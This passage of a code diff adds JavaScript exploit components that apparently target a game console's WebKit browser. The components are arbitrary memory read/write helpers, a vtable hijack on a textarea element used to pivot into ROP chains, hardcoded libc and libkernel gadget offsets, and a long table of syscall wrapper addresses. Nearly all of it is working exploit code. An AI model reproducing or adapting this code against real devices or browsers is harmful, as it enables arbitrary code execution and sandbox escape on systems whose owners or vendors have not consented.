+  for (var i = 7; i >= 0; i--)
+    ans = 256 * ans + d[i];
+  return ans;
+}
+
+function write_ptr_at(p, d) {
+  var arr = [];
+  for (var i = 0; i < 8; i++) {
+    arr.push(d & 0xff);
+    d /= 256;
+  }
+  write_mem(p, arr);
+}
+
+function hex(x) {
+  return (new Number(x)).toString(16);
+}
+
+/* malloc.js */
+var malloc_nogc = [];
+function malloc(sz) {
+  var arr = new Uint8Array(sz);
+  malloc_nogc.push(arr);
+  return read_ptr_at(addrof(arr) + 0x10);
+}
+
+/* rop.js */
+var tarea = document.createElement('textarea');
+
+var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
+var fake_vt_ptr = malloc(0x400);
+write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
+write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
+
+var real_vtable = read_ptr_at(fake_vt_ptr);
+var fake_vtable = malloc(0x2000);
+write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
+write_ptr_at(fake_vt_ptr, fake_vtable);
+
+var fake_vt_ptr_bak = malloc(0x400);
+write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
+
+var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
+
+function get_got_addr(idx) {
+  var p = plt_ptr + idx * 16;
+  var q = read_mem(p, 6);
+  if (q[0] != 0xff || q[1] != 0x25)
+    throw "invalid GOT entry";
+  var offset = 0;
+  for (var i = 5; i >= 2; i--)
+    offset = offset * 256 + q[i];
+  offset += p + 6;
+  return read_ptr_at(offset);
+}
+
+//these are not real bases but rather some low addresses
+var webkit_base = read_ptr_at(fake_vtable);
+var libkernel_base = get_got_addr(705) - 0x10000;
+var libc_base = get_got_addr(582);
+var saveall_addr = libc_base + 0x2e2c8;
+var loadall_addr = libc_base + 0x3275c;
+var setjmp_addr = libc_base + 0xbfae0;
+var longjmp_addr = libc_base + 0xbfb30;
+var pivot_addr = libc_base + 0x327d2;
+var infloop_addr = libc_base + 0x447a0;
+var jop_frame_addr = libc_base + 0x715d0;
+var get_errno_addr_addr = libkernel_base + 0x9ff0;
+var pthread_create_addr = libkernel_base + 0xf980;
+
+function saveall() {
+  var ans = malloc(0x800);
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  tarea.scrollLeft = 0;
+  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
+  tarea.scrollLeft = 0;
+  write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  return ans;
+}
+
+/* PUBLIC ROP API
+
+This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
+* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
+* the actual ROP chain starts at `buf+8`
+* jump to `pivot_addr` to return
+*/
+function pivot(buf) {
+  var ans = malloc(0x400);
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+  tarea.scrollLeft = 0;
+  write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+  var bak = read_ptr_at(fake_vtable + 0x1d8);
+  write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
+  write_ptr_at(fake_vt_ptr + 0x38, buf);
+  write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
+  write_ptr_at(buf, ans);
+  tarea.scrollLeft = 0;
+  write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+}
+
+/* syscalls.js */
+var sys_670_addr = libkernel_base + 0x1efc0;
+var sys_192_addr = libkernel_base + 0x1efe0;
+var sys_586_addr = libkernel_base + 0x1f000;
+var sys_545_addr = libkernel_base + 0x1f020;
+var sys_362_addr = libkernel_base + 0x1f040;
+var sys_363_addr = libkernel_base + 0x1f060;
+var sys_206_addr = libkernel_base + 0x1f080;
+var sys_5_addr = libkernel_base + 0x1f0a0;
+var sys_432_addr = libkernel_base + 0x1f0c0;
+var sys_136_addr = libkernel_base + 0x1f0e0;
+var sys_42_addr = libkernel_base + 0x1f100;
+var sys_188_addr = libkernel_base + 0x1f130;
+var sys_4_addr = libkernel_base + 0x1f150;
+var sys_546_addr = libkernel_base + 0x1f170;
+var sys_236_addr = libkernel_base + 0x1f190;
+var sys_127_addr = libkernel_base + 0x1f1b0;
+var sys_533_addr = libkernel_base + 0x1f1d0;
+var sys_429_addr = libkernel_base + 0x1f1f0;
+var sys_658_addr = libkernel_base + 0x1f210;
+var sys_345_addr = libkernel_base + 0x1f230;
+var sys_623_addr = libkernel_base + 0x1f250;
+var sys_329_addr = libkernel_base + 0x1f270;
+var sys_551_addr = libkernel_base + 0x1f290;
+var sys_593_addr = libkernel_base + 0x1f2b0;
+var sys_555_addr = libkernel_base + 0x1f2e0;
+var sys_673_addr = libkernel_base + 0x1f300;
+var sys_253_addr = libkernel_base + 0x1f320;
+var sys_272_addr = libkernel_base + 0x1f340;
+var sys_466_addr = libkernel_base + 0x1f360;
+var sys_539_addr = libkernel_base + 0x1f380;
+var sys_454_addr = libkernel_base + 0x1f3a0;
+var sys_33_addr = libkernel_base + 0x1f3c0;
+var sys_55_addr = libkernel_base + 0x1f3e0;
+var sys_53_addr = libkernel_base + 0x1f400;
+var sys_421_addr = libkernel_base + 0x1f424;
+var sys_73_addr = libkernel_base + 0x1f450;
+var sys_23_addr = libkernel_base + 0x1f470;
+var sys_543_addr = libkernel_base + 0x1f490;
+var sys_422_addr = libkernel_base + 0x1f4b0;
+var sys_592_addr = libkernel_base + 0x1f4d0;
+var sys_147_addr = libkernel_base + 0x1f4f0;
+var sys_397_addr = libkernel_base + 0x1f510;
+var sys_663_addr = libkernel_base + 0x1f530;
+var sys_30_addr = libkernel_base + 0x1f550;
+var sys_637_addr = libkernel_base + 0x1f570;
+var sys_616_addr = libkernel_base + 0x1f590;
+var sys_671_addr = libkernel_base + 0x1f5b0;
+var sys_341_addr = libkernel_base + 0x1f5d0;
+var sys_479_addr = libkernel_base + 0x1f5f0;
+var sys_95_addr = libkernel_base + 0x1f610;
+var sys_59_addr = libkernel_base + 0x1f63d;
+var sys_540_addr = libkernel_base + 0x1f660;
+var sys_101_addr = libkernel_base + 0x1f680;
+var sys_655_addr = libkernel_base + 0x1f6a0;
+var sys_549_addr = libkernel_base + 0x1f6c0;
+var sys_49_addr = libkernel_base + 0x1f6e0;
+var sys_78_addr = libkernel_base + 0x1f700;
+var sys_134_addr = libkernel_base + 0x1f720;
+var sys_44_addr = libkernel_base + 0x1f740;
+var sys_289_addr = libkernel_base + 0x1f760;
+var sys_25_addr = libkernel_base + 0x1f780;
+var sys_643_addr = libkernel_base + 0x1f7a0;
+var sys_456_addr = libkernel_base + 0x1f7c0;
+var sys_664_addr = libkernel_base + 0x1f7e0;
+var sys_607_addr = libkernel_base + 0x1f800;
+var sys_563_addr = libkernel_base + 0x1f820;
+var sys_662_addr = libkernel_base + 0x1f840;
+var sys_251_addr = libkernel_base + 0x1f869;
+var sys_1_addr = libkernel_base + 0x1f88a;
+var sys_657_addr = libkernel_base + 0x1f8b0;
+var sys_343_addr = libkernel_base + 0x1f8d0;
+var sys_238_addr = libkernel_base + 0x1f8f0;
+var sys_566_addr = libkernel_base + 0x1f910;
+var sys_402_addr = libkernel_base + 0x1f930;
+var sys_328_addr = libkernel_base + 0x1f950;
+var sys_423_addr = libkernel_base + 0x1f970;
+var sys_567_addr = libkernel_base + 0x1f990;
+var sys_610_addr = libkernel_base + 0x1f9b0;
+var sys_65_addr = libkernel_base + 0x1f9d0;
+var sys_346_addr = libkernel_base + 0x1f9f0;
+var sys_190_addr = libkernel_base + 0x1fa10;
+var sys_619_addr = libkernel_base + 0x1fa30;
+var sys_538_addr = libkernel_base + 0x1fa50;
+var sys_75_addr = libkernel_base + 0x1fa70;
+var sys_487_addr = libkernel_base + 0x1fa90;
+var sys_544_addr = libkernel_base + 0x1fab0;
+var sys_50_addr = libkernel_base + 0x1fad0;
+var sys_404_addr = libkernel_base + 0x1fb00;
+var sys_564_addr = libkernel_base + 0x1fb20;
+var sys_558_addr = libkernel_base + 0x1fb40;
+var sys_116_addr = libkernel_base + 0x1fb60;
+var sys_3_addr = libkernel_base + 0x1fb80;
+var sys_634_addr = libkernel_base + 0x1fba0;
+var sys_548_addr = libkernel_base + 0x1fbc0;
+var sys_165_addr = libkernel_base + 0x1fbe0;
+var sys_638_addr = libkernel_base + 0x1fc00;
+var sys_541_addr = libkernel_base + 0x1fc20;
+var sys_195_addr = libkernel_base + 0x1fc40;
+var sys_31_addr = libkernel_base + 0x1fc60;
+var sys_665_addr = libkernel_base + 0x1fc80;
+var sys_478_addr = libkernel_base + 0x1fca0;
+var sys_98_addr = libkernel_base + 0x1fcc0;
+var sys_29_addr = libkernel_base + 0x1fce0;
+var sys_194_addr = libkernel_base + 0x1fd00;
+var sys_656_addr = libkernel_base + 0x1fd20;
+var sys_632_addr = libkernel_base + 0x1fd40;
+var sys_454_addr = libkernel_base + 0x1fd60;
+var sys_37_addr = libkernel_base + 0x1fd70;
+var sys_599_addr = libkernel_base + 0x1fd90;
+var sys_32_addr = libkernel_base + 0x1fdb0;
+var sys_554_addr = libkernel_base + 0x1fdd0;
+var sys_59_addr = libkernel_base + 0x1fdf0;
+var sys_131_addr = libkernel_base + 0x1fe10;
+var sys_417_addr = libkernel_base + 0x1fe30;
+var sys_547_addr = libkernel_base + 0x1fe50;
+var sys_476_addr = libkernel_base + 0x1fe70;
+var sys_642_addr = libkernel_base + 0x1fe90;
+var sys_407_addr = libkernel_base + 0x1feb0;
+var sys_393_addr = libkernel_base + 0x1fed0;
+var sys_113_addr = libkernel_base + 0x1fef0;
+var sys_10_addr = libkernel_base + 0x1ff10;
+var sys_633_addr = libkernel_base + 0x1ff30;
+var sys_535_addr = libkernel_base + 0x1ff50;
+var sys_488_addr = libkernel_base + 0x1ff70;
+var sys_232_addr = libkernel_base + 0x1ff90;
+var sys_481_addr = libkernel_base + 0x1ffb0;
+var sys_636_addr = libkernel_base + 0x1ffd0;
+var sys_93_addr = libkernel_base + 0x1fff0;
+var sys_522_addr = libkernel_base + 0x20010;
+var sys_36_addr = libkernel_base + 0x20030;
+var sys_135_addr = libkernel_base + 0x20050;
+var sys_646_addr = libkernel_base + 0x20070;
+var sys_674_addr = libkernel_base + 0x20090;
+var sys_629_addr = libkernel_base + 0x200b0;
+var sys_24_addr = libkernel_base + 0x200d0;
+var sys_56_addr = libkernel_base + 0x200f0;
+var sys_340_addr = libkernel_base + 0x20113;
+var sys_182_addr = libkernel_base + 0x201a0;
+var sys_486_addr = libkernel_base + 0x201c0;
+var sys_542_addr = libkernel_base + 0x201e0;
+var sys_332_addr = libkernel_base + 0x20200;
+var sys_416_addr = libkernel_base + 0x20220;
+var sys_622_addr = libkernel_base + 0x20240;
+var sys_669_addr = libkernel_base + 0x20260;
+var sys_620_addr = libkernel_base + 0x20280;
+var sys_122_addr = libkernel_base + 0x202a0;
+var sys_27_addr = libkernel_base + 0x202c0;
+var sys_661_addr = libkernel_base + 0x202e0;
+var sys_80_addr = libkernel_base + 0x20300;
+var sys_666_addr = libkernel_base + 0x20320;
+var sys_240_addr = libkernel_base + 0x20340;
+var sys_654_addr = libkernel_base + 0x20360;
+var sys_430_addr = libkernel_base + 0x20380;
+var sys_325_addr = libkernel_base + 0x203a0;
+var sys_608_addr = libkernel_base + 0x203c0;
+var sys_290_addr = libkernel_base + 0x203e0;
+var sys_588_addr = libkernel_base + 0x20400;
+var sys_532_addr = libkernel_base + 0x20420;
+var sys_79_addr = libkernel_base + 0x20440;
+var sys_552_addr = libkernel_base + 0x20460;
+var sys_550_addr = libkernel_base + 0x20480;
+var sys_649_addr = libkernel_base + 0x204a0;
+var sys_560_addr = libkernel_base + 0x204c0;
+var sys_628_addr = libkernel_base + 0x204e0;
+var sys_444_addr = libkernel_base + 0x20500;
+var sys_74_addr = libkernel_base + 0x20520;
+var sys_403_addr = libkernel_base + 0x205f0;
+var sys_400_addr = libkernel_base + 0x20610;
+var sys_334_addr = libkernel_base + 0x20630;
+var sys_86_addr = libkernel_base + 0x20650;
+var sys_20_addr = libkernel_base + 0x20670;
+var sys_102_addr = libkernel_base + 0x20690;
+var sys_627_addr = libkernel_base + 0x206b0;
+var sys_581_addr = libkernel_base + 0x206d0;
+var sys_602_addr = libkernel_base + 0x206f0;
+var sys_534_addr = libkernel_base + 0x20710;
+var sys_183_addr = libkernel_base + 0x20730;
+var sys_640_addr = libkernel_base + 0x20750;
+var sys_234_addr = libkernel_base + 0x20770;
+var sys_83_addr = libkernel_base + 0x20790;
+var sys_431_addr = libkernel_base + 0x207b0;
+var sys_600_addr = libkernel_base + 0x207d0;
+var sys_433_addr = libkernel_base + 0x207f0;
+var sys_1_addr = libkernel_base + 0x20810;
+var sys_90_addr = libkernel_base + 0x20830;
+var sys_138_addr = libkernel_base + 0x20850;
+var sys_475_addr = libkernel_base + 0x20870;
+var sys_536_addr = libkernel_base + 0x20890;
+var sys_237_addr = libkernel_base + 0x208b0;
+var sys_327_addr = libkernel_base + 0x208d0;
+var sys_668_addr = libkernel_base + 0x208f0;
+var sys_553_addr = libkernel_base + 0x20910;
+var sys_672_addr = libkernel_base + 0x20930;
+var sys_612_addr = libkernel_base + 0x20950;
+var sys_47_addr = libkernel_base + 0x20970;
+var sys_189_addr = libkernel_base + 0x20990;
+var sys_2_addr = libkernel_base + 0x209b0;
+var sys_557_addr = libkernel_base + 0x209d0;
+var sys_565_addr = libkernel_base + 0x209f0;
+var sys_613_addr = libkernel_base + 0x20a10;
+var sys_196_addr = libkernel_base + 0x20a30;
+var sys_117_addr = libkernel_base + 0x20a50;
+var sys_126_addr = libkernel_base + 0x20a70;
+var sys_7_addr = libkernel_base + 0x20a90;
+var sys_202_addr = libkernel_base + 0x20ab0;
+var sys_104_addr = libkernel_base + 0x20ad0;
+var sys_331_addr = libkernel_base + 0x20af0;
+var sys_604_addr = libkernel_base + 0x20b10;
+var sys_615_addr = libkernel_base + 0x20b30;
+var sys_105_addr = libkernel_base + 0x20b50;
+var sys_594_addr = libkernel_base + 0x20b70;
+var sys_100_addr = libkernel_base + 0x20b90;
+var sys_677_addr = libkernel_base + 0x20bb0;
+var sys_625_addr = libkernel_base + 0x20bd0;
+var sys_596_addr = libkernel_base + 0x20bf0;
+var sys_99_addr = libkernel_base + 0x20c10;
+var sys_401_addr = libkernel_base + 0x20c30;
+var sys_125_addr = libkernel_base + 0x20c50;
+var sys_15_addr = libkernel_base + 0x20c70;
+var sys_315_addr = libkernel_base + 0x20c90;
+var sys_441_addr = libkernel_base + 0x20cb0;
+var sys_591_addr = libkernel_base + 0x20cd0;
+var sys_618_addr = libkernel_base + 0x20cf0;
+var sys_556_addr = libkernel_base + 0x20d10;
+var sys_121_addr = libkernel_base + 0x20d30;
+var sys_239_addr = libkernel_base + 0x20d50;
+var sys_137_addr = libkernel_base + 0x20d70;
+var sys_333_addr = libkernel_base + 0x20d90;
+var sys_595_addr = libkernel_base + 0x20db0;
+var sys_464_addr = libkernel_base + 0x20dd0;
+var sys_324_addr = libkernel_base + 0x20df0;
+var sys_499_addr = libkernel_base + 0x20e10;
+var sys_583_addr = libkernel_base + 0x20e30;
+var sys_340_addr = libkernel_base + 0x20e50;
+var sys_12_addr = libkernel_base + 0x20e70;
+var sys_630_addr = libkernel_base + 0x20e90;
+var sys_379_addr = libkernel_base + 0x20eb0;
+var sys_443_addr = libkernel_base + 0x20ed0;
+var sys_653_addr = libkernel_base + 0x20ef0;
+var sys_455_addr = libkernel_base + 0x20f10;
+var sys_204_addr = libkernel_base + 0x20f30;
+var sys_35_addr = libkernel_base + 0x20f50;
+var sys_480_addr = libkernel_base + 0x20f70;
+var sys_128_addr = libkernel_base + 0x20f90;
+var sys_209_addr = libkernel_base + 0x20fb0;
+var sys_582_addr = libkernel_base + 0x20fd0;
+var sys_310_addr = libkernel_base + 0x20ff0;
+var sys_572_addr = libkernel_base + 0x21010;
+var sys_124_addr = libkernel_base + 0x21030;
+var sys_435_addr = libkernel_base + 0x21050;
+var sys_477_addr = libkernel_base + 0x21070;
+var sys_235_addr = libkernel_base + 0x21090;
+var sys_41_addr = libkernel_base + 0x210b0;
+var sys_28_addr = libkernel_base + 0x210d0;
+var sys_6_addr = libkernel_base + 0x210f0;
+var sys_606_addr = libkernel_base + 0x21110;
+var sys_43_addr = libkernel_base + 0x21130;
+var sys_624_addr = libkernel_base + 0x21150;
+var sys_598_addr = libkernel_base + 0x21170;
+var sys_92_addr = libkernel_base + 0x21190;
+var sys_39_addr = libkernel_base + 0x211b0;
+var sys_120_addr = libkernel_base + 0x211d0;
+var sys_603_addr = libkernel_base + 0x211f0;
+var sys_106_addr = libkernel_base + 0x21210;
+var sys_648_addr = libkernel_base + 0x21230;
+var sys_617_addr = libkernel_base + 0x21250;
+var sys_406_addr = libkernel_base + 0x21270;
+var sys_641_addr = libkernel_base + 0x21290;
+var sys_483_addr = libkernel_base + 0x212b0;
+var sys_675_addr = libkernel_base + 0x212d0;
+var sys_660_addr = libkernel_base + 0x212f0;
+var sys_203_addr = libkernel_base + 0x21310;
+var sys_605_addr = libkernel_base + 0x21330;
+var sys_647_addr = libkernel_base + 0x21350;
+var sys_233_addr = libkernel_base + 0x21370;
+var sys_408_addr = libkernel_base + 0x21390;
+var sys_405_addr = libkernel_base + 0x213b0;
+var sys_635_addr = libkernel_base + 0x213d0;
+var sys_667_addr = libkernel_base + 0x213f0;
+var sys_89_addr = libkernel_base + 0x21410;
+var sys_34_addr = libkernel_base + 0x21430;
+var sys_482_addr = libkernel_base + 0x21450;
+var sys_584_addr = libkernel_base + 0x21470;
+var sys_659_addr = libkernel_base + 0x21490;
+var sys_114_addr = libkernel_base + 0x214b0;
+var sys_330_addr = libkernel_base + 0x214d0;
+var sys_191_addr = libkernel_base + 0x214f0;
+var sys_639_addr = libkernel_base + 0x21510;
+var sys_96_addr = libkernel_base + 0x21530;
+var sys_676_addr = libkernel_base + 0x21550;
+var sys_652_addr = libkernel_base + 0x21570;
+var sys_54_addr = libkernel_base + 0x21590;
+var sys_626_addr = libkernel_base + 0x215b0;
+var sys_580_addr = libkernel_base + 0x215d0;
+var sys_97_addr = libkernel_base + 0x215f0;
+var sys_434_addr = libkernel_base + 0x21610;
+var sys_442_addr = libkernel_base + 0x21630;
+var sys_585_addr = libkernel_base + 0x21650;
+var sys_587_addr = libkernel_base + 0x21670;
+var sys_601_addr = libkernel_base + 0x21690;
+var sys_118_addr = libkernel_base + 0x216b0;
+var sys_611_addr = libkernel_base + 0x216d0;
+var sys_140_addr = libkernel_base + 0x216f0;
+var sys_141_addr = libkernel_base + 0x21710;
+var sys_392_addr = libkernel_base + 0x21730;
+var sys_559_addr = libkernel_base + 0x21750;
+var sys_133_addr = libkernel_base + 0x21770;
+
+/* syscalls2.js */
+var aio_init_addr = sys_670_addr;
+var fpathconf_addr = sys_192_addr;
+var dmem_container_addr = sys_586_addr;
+var evf_clear_addr = sys_545_addr;
+var kqueue_addr = sys_362_addr;
+var kevent_addr = sys_363_addr;
+var futimes_addr = sys_206_addr;
+var open_addr = sys_5_addr;
+var thr_self_addr = sys_432_addr;
+var mkdir_addr = sys_136_addr;
+var pipe_addr = sys_42_addr;
+var stat_addr = sys_188_addr;
+var write_addr = sys_4_addr;
+var evf_cancel_addr = sys_546_addr;
+var ktimer_delete_addr = sys_236_addr;
+var setregid_addr = sys_127_addr;
+var jitshm_create_addr = sys_533_addr;
+var sigwait_addr = sys_429_addr;
+var fdatasync_addr = sys_658_addr;
+var sigtimedwait_addr = sys_345_addr;
+var get_gpo_addr = sys_623_addr;
+var sched_setscheduler_addr = sys_329_addr;
+var osem_open_addr = sys_551_addr;
+var dynlib_get_info_addr = sys_593_addr;
+var osem_post_addr = sys_555_addr;
+var blockpool_move_addr = sys_673_addr;
+var issetugid_addr = sys_253_addr;
+var getdents_addr = sys_272_addr;
+var rtprio_thread_addr = sys_466_addr;
+var evf_delete_addr = sys_539_addr;
+var _umtx_op_addr = sys_454_addr;
+var access_addr = sys_33_addr;
+var reboot_addr = sys_55_addr;
+var sigaltstack_addr = sys_53_addr;
+var getcontext_addr = sys_421_addr;
+var munmap_addr = sys_73_addr;
+var setuid_addr = sys_23_addr;
+var evf_trywait_addr = sys_543_addr;
+var setcontext_addr = sys_422_addr;
+var dynlib_get_list_addr = sys_592_addr;
+var setsid_addr = sys_147_addr;
+var fstatfs_addr = sys_397_addr;
+var aio_multi_wait_addr = sys_663_addr;
+var accept_addr = sys_30_addr;
+var set_phys_fmem_limit_addr = sys_637_addr;
+var thr_get_name_addr = sys_616_addr;
+var get_page_table_stats_addr = sys_671_addr;
+var sigsuspend_addr = sys_341_addr;
+var truncate_addr = sys_479_addr;
+var fsync_addr = sys_95_addr;
+var execve_addr = sys_59_addr;
+var evf_open_addr = sys_540_addr;
+var netabort_addr = sys_101_addr;
+var blockpool_unmap_addr = sys_655_addr;
+var osem_create_addr = sys_549_addr;
+var getlogin_addr = sys_49_addr;
+var mincore_addr = sys_78_addr;
+var shutdown_addr = sys_134_addr;
+var profil_addr = sys_44_addr;
+var preadv_addr = sys_289_addr;
+var geteuid_addr = sys_25_addr;
+var set_chicken_switches_addr = sys_643_addr;
+var sigqueue_addr = sys_456_addr;
+var aio_multi_poll_addr = sys_664_addr;
+var get_self_auth_info_addr = sys_607_addr;
+var opmc_enable_addr = sys_563_addr;
+var aio_multi_delete_addr = sys_662_addr;
+var rfork_addr = sys_251_addr;
+var sys_exit_addr = sys_1_addr;
+var blockpool_batch_addr = sys_657_addr;
+var sigpending_addr = sys_343_addr;
+var ktimer_gettime_addr = sys_238_addr;
+var opmc_set_ctr_addr = sys_566_addr;
+var ksem_wait_addr = sys_402_addr;
+var sched_getparam_addr = sys_328_addr;
+var swapcontext_addr = sys_423_addr;
+var opmc_get_ctr_addr = sys_567_addr;
+var budget_get_ptype_addr = sys_610_addr;
+var msync_addr = sys_65_addr;
+var sigwaitinfo_addr = sys_346_addr;
+var lstat_addr = sys_190_addr;
+var test_debug_rwmem_addr = sys_619_addr;
+var evf_create_addr = sys_538_addr;
+var madvise_addr = sys_75_addr;
+var cpuset_getaffinity_addr = sys_487_addr;
+var evf_set_addr = sys_544_addr;
+var setlogin_addr = sys_50_addr;
+var ksem_init_addr = sys_404_addr;
+var opmc_disable_addr = sys_564_addr;
+var namedobj_delete_addr = sys_558_addr;
+var gettimeofday_addr = sys_116_addr;
+var read_addr = sys_3_addr;
+var thr_get_ucontext_addr = sys_634_addr;
+var batch_map_addr = sys_548_addr;
+var sysarch_addr = sys_165_addr;
+var utc_to_localtime_addr = sys_638_addr;
+var evf_close_addr = sys_541_addr;
+var setrlimit_addr = sys_195_addr;
+var getpeername_addr = sys_31_addr;
+var aio_get_data_addr = sys_665_addr;
+var lseek_addr = sys_478_addr;
+var connect_addr = sys_98_addr;
+var recvfrom_addr = sys_29_addr;
+var getrlimit_addr = sys_194_addr;
+var dynlib_get_info_for_libdbg_addr = sys_656_addr;
+var thr_suspend_ucontext_addr = sys_632_addr;
+var _umtx_op_addr = sys_454_addr;
+var kill_addr = sys_37_addr;
+var dynlib_process_needed_and_relocate_addr = sys_599_addr;
+var getsockname_addr = sys_32_addr;
+var osem_trywait_addr = sys_554_addr;
+var execve_addr = sys_59_addr;
+var flock_addr = sys_131_addr;
+var sigreturn_addr = sys_417_addr;
+var query_memory_protection_addr = sys_547_addr;
+var pwrite_addr = sys_476_addr;
+var get_map_statistics_addr = sys_642_addr;
+var ksem_getvalue_addr = sys_407_addr;
+var sendfile_addr = sys_393_addr;
+var socketex_addr = sys_113_addr;
+var unlink_addr = sys_10_addr;
+var thr_resume_ucontext_addr = sys_633_addr;
+var dl_get_list_addr = sys_535_addr;
+var cpuset_setaffinity_addr = sys_488_addr;
+var clock_gettime_addr = sys_232_addr;
+var thr_kill2_addr = sys_481_addr;
+var set_timezone_info_addr = sys_636_addr;
+var select_addr = sys_93_addr;
+var pselect_addr = sys_522_addr;
+var sync_addr = sys_36_addr;
+var socketpair_addr = sys_135_addr;
+var get_kernel_mem_statistics_addr = sys_646_addr;
+var virtual_query_all_addr = sys_674_addr;
+var physhm_open_addr = sys_629_addr;
+var getuid_addr = sys_24_addr;
+var revoke_addr = sys_56_addr;
+var sigprocmask_addr = sys_340_addr;
+var setegid_addr = sys_182_addr;
+var cpuset_getid_addr = sys_486_addr;
+var evf_wait_addr = sys_542_addr;
+var sched_get_priority_max_addr = sys_332_addr;
+var sigaction_addr = sys_416_addr;
+var ipmimgr_call_addr = sys_622_addr;
+var aio_submit_cmd_addr = sys_669_addr;
+var free_stack_addr = sys_620_addr;
+var settimeofday_addr = sys_122_addr;
+var recvmsg_addr = sys_27_addr;
+var aio_submit_addr = sys_661_addr;
+var setgroups_addr = sys_80_addr;
+var aio_multi_cancel_addr = sys_666_addr;
+var nanosleep_addr = sys_240_addr;
+var blockpool_map_addr = sys_654_addr;
+var thr_create_addr = sys_430_addr;
+var munlockall_addr = sys_325_addr;
+var dynlib_get_info_ex_addr = sys_608_addr;
+var pwritev_addr = sys_290_addr;
+var mname_addr = sys_588_addr;
+var regmgr_call_addr = sys_532_addr;
+var getgroups_addr = sys_79_addr;
+var osem_close_addr = sys_552_addr;
+var osem_delete_addr = sys_550_addr;
+var dynlib_get_obj_member_addr = sys_649_addr;
+var debug_init_addr = sys_560_addr;
+var mmap_dmem_addr = sys_628_addr;
+var kldunloadf_addr = sys_444_addr;
+var mprotect_addr = sys_74_addr;
+var ksem_trywait_addr = sys_403_addr;
+var ksem_close_addr = sys_400_addr;
+var sched_rr_get_interval_addr = sys_334_addr;
+var getitimer_addr = sys_86_addr;
+var getpid_addr = sys_20_addr;
+var netgetsockinfo_addr = sys_102_addr;
+var get_cpu_usage_all_addr = sys_627_addr;
+var eport_delete_addr = sys_581_addr;
+var randomized_path_addr = sys_602_addr;
+var jitshm_alias_addr = sys_534_addr;
+var seteuid_addr = sys_183_addr;
+var set_uevt_addr = sys_640_addr;
+var clock_getres_addr = sys_234_addr;
+var setitimer_addr = sys_83_addr;
+var thr_exit_addr = sys_431_addr;
+var sandbox_path_addr = sys_600_addr;
+var thr_kill_addr = sys_433_addr;
+var sys_exit_addr = sys_1_addr;
+var dup2_addr = sys_90_addr;
+var utimes_addr = sys_138_addr;
+var pread_addr = sys_475_addr;
+var dl_get_info_addr = sys_536_addr;
+var ktimer_settime_addr = sys_237_addr;
+var sched_setparam_addr = sys_327_addr;
+var aio_create_addr = sys_668_addr;
+var osem_wait_addr = sys_553_addr;
+var dynlib_get_list_for_libdbg_addr = sys_672_addr;
+var get_proc_type_info_addr = sys_612_addr;
+var getgid_addr = sys_47_addr;
+var fstat_addr = sys_189_addr;
+var fork_addr = sys_2_addr;
+var namedobj_create_addr = sys_557_addr;
+var opmc_set_ctl_addr = sys_565_addr;
+var get_resident_count_addr = sys_613_addr;
+var getdirentries_addr = sys_196_addr;
+var getrusage_addr = sys_117_addr;
+var setreuid_addr = sys_126_addr;
+var wait4_addr = sys_7_addr;
+var __sysctl_addr = sys_202_addr;
+var bind_addr = sys_104_addr;
+var sched_yield_addr = sys_331_addr;
+var dl_get_metadata_addr = sys_604_addr;
+var get_resident_fmem_count_addr = sys_615_addr;
+var setsockopt_addr = sys_105_addr;
+var dynlib_load_prx_addr = sys_594_addr;
+var getpriority_addr = sys_100_addr;
+var get_phys_page_size_addr = sys_677_addr;
+var opmc_set_hw_addr = sys_625_addr;
+var dynlib_do_copy_relocations_addr = sys_596_addr;
+var netcontrol_addr = sys_99_addr;
+var ksem_post_addr = sys_401_addr;
+var netgetiflist_addr = sys_125_addr;
+var chmod_addr = sys_15_addr;
+var aio_suspend_addr = sys_315_addr;
+var ksem_timedwait_addr = sys_441_addr;
+var dynlib_dlsym_addr = sys_591_addr;
+var get_paging_stats_of_all_objects_addr = sys_618_addr;
+var osem_cancel_addr = sys_556_addr;
+var writev_addr = sys_121_addr;
+var ktimer_getoverrun_addr = sys_239_addr;
+var rmdir_addr = sys_137_addr;
+var sched_get_priority_min_addr = sys_333_addr;
+var dynlib_unload_prx_addr = sys_595_addr;
+var thr_set_name_addr = sys_464_addr;
+var mlockall_addr = sys_324_addr;
+var openat_addr = sys_499_addr;
+var eport_open_addr = sys_583_addr;
+var sigprocmask_addr = sys_340_addr;
+var chdir_addr = sys_12_addr;
+var physhm_unlink_addr = sys_630_addr;
+var mtypeprotect_addr = sys_379_addr;
+var thr_wake_addr = sys_443_addr;
+var blockpool_open_addr = sys_653_addr;
+var thr_new_addr = sys_455_addr;
+var munlock_addr = sys_204_addr;
+var fchflags_addr = sys_35_addr;
+var ftruncate_addr = sys_480_addr;
+var rename_addr = sys_128_addr;
+var poll_addr = sys_209_addr;
+var eport_trigger_addr = sys_582_addr;
+var getsid_addr = sys_310_addr;
+var virtual_query_addr = sys_572_addr;
+var fchmod_addr = sys_124_addr;
+var _umtx_unlock_addr = sys_435_addr;
+var mmap_addr = sys_477_addr;
+var ktimer_create_addr = sys_235_addr;
+var dup_addr = sys_41_addr;
+var sendmsg_addr = sys_28_addr;
+var close_addr = sys_6_addr;
+var is_development_mode_addr = sys_606_addr;
+var getegid_addr = sys_43_addr;
+var get_vm_map_timestamp_addr = sys_624_addr;
